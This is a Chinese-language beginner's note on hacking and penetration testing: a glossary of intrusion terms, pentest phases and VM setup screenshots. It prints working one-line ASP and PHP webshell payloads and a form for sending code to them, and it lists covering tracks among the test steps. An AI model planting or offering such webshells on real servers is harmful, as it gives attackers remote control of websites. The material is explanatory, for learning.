##术语词汇介绍


* 肉鸡:被黑客入侵并长期驻扎的计算机或服务器。


* 抓鸡：利用使用量大的程序的漏洞，使用自动化方式获取肉鸡的行为。


* WebShell：通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。


* 漏洞：硬件、软件、协议等等的可利用的安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。


* 一句话 木马：通过向服务端提交一句简短的代码，配合本地客户端实现webshell功能的木马。
```php
<%eval request("pass")%>
```
```php
<%execute(request("pass"))%>
```
`request("pass")` 接收客户端提交的数据，`pass` 为执行命令的参数值。
`eval/execute` 函数执行客户端命令的内容。
如：PHP的一句话木马： 
```php
<?php eval($_POST[MM]);?>
```
下面的代码可以用 POST 的方式提交 PHP 语句，利用PHP脚本的各种函数，就可以实现执行系统命令、修改数据库、增删改查文件等等的各种功能。

```html
<form method="post " action="http://木马地址">
	<textarea name="MM">
		// 这里写PHP代码
		phpinfo();
	</textarea>
</form>
```


* 提权：操作系统低权限的账户将自己提升为管理员权限使用的方法。


* 后门：黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。


* 跳板：使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份。


* 旁站入侵：即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRoot、御剑、明小子和web在线查询等。


* C段入侵：即同C段下服务器入侵。如目标ip为192.168.2.250 入侵192.168.2.* 的任意一个机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在unix环境下有Sniffit、Snoop、Tcpdump、Dsniff等。


##渗透测试：


* 黑盒测试：
未授权的情况下。模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。
黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合能力（OS、Database、Script、code、思路、社工）
思路与经验积累往往决定成败。
三个臭皮匠顶过诸葛亮。

* 白盒测试：
相对于黑盒测试，白盒测试基本是从内部发起。

* 黑白盒的另一种说法：
知道源代码和不知道源代码的渗透测试。
这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。

* APT攻击：Advanced Persistent Threat，高级可持续攻击，是指组织或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。
1.极强的隐蔽性
2.潜伏期长、持续性强
3.目标性强

* 渗透测试的特点：
1.充满挑战与刺激，不达目的不罢休
2.思路与经验积累往往决定成败

* 渗透测试与入侵的最大区别：
1. 渗透测试：更全面地找出服务器的问题，更倾向于保护。
2. 入侵：不择手段地（甚至是具有破坏性的）拿到权限。


* 一般渗透测试流程:


1. 明确目标
	确定范围
	确定规则
	确定需求

2.  信息收集
	基础信息
	系统信息
	应用信息
	版本信息
	服务信息
	人员信息
	防护信息

3.  漏洞探测
	系统漏洞
	WebServer漏洞
	Web应用漏洞
	其他端口服务漏洞
	通信安全
	
4.  漏洞验证
	自动化验证
	手工验证
	试验验证
	登录猜解
	业务漏洞验证
	公开资源的利用
	
5.  形成报告
	按需整理
	补充介绍
	修补建议
	
6.  信息整理
	整理渗透工具
	整理收集信息
	
7.  获取所需
	实施攻击
	获取内部信息
	进一步渗透
	持续性存在
	清理痕迹
	
8.  信息分析
	精准打击
	绕过防御机制
	定制攻击路径
	绕过检测机制
	攻击代码 


<!-- * 经验分享：


1. 信息收集是关键
2. 做事不要太心急
3. 多学习，多看源码
4. 平时注意收集 0day
5. 思路很重要 -->

##虚拟机安装WindowsServer2003的过程截图：
* VMware15 下载地址：https://www.7down.com/soft/310739.html
* 安装步骤


1.  VMware 点击创建新的虚拟机
![avatar](/src/static/img/xnj1.png)
2.  选择典型  
![avatar](/src/static/img/xnj2.png)
3.  选择稍后安装操作系统  
![avatar](/src/static/img/xnj3.png)
4.  选择WindowsServer2003 Enterprise Edition
![avatar](/src/static/img/xnj4.png)
5.  输入虚拟机名称，选择存储路径 
![avatar](/src/static/img/xnj5.png)
6.  设置虚拟磁盘容量  
![avatar](/src/static/img/xnj6.png)
7.  点击完成  
![avatar](/src/static/img/xnj7.png)
8.  编辑虚拟机设置   
![avatar](/src/static/img/xnj8.png)
9.  选择系统镜像文件    
![avatar](/src/static/img/xnj9.png)
10.  开机    
![avatar](/src/static/img/xnj10.png)
11.  进入到安装引导页面  具体安装过程略  
![avatar](/src/static/img/xnj11.png)
12.  安装完成    
![avatar](/src/static/img/xnj12.png)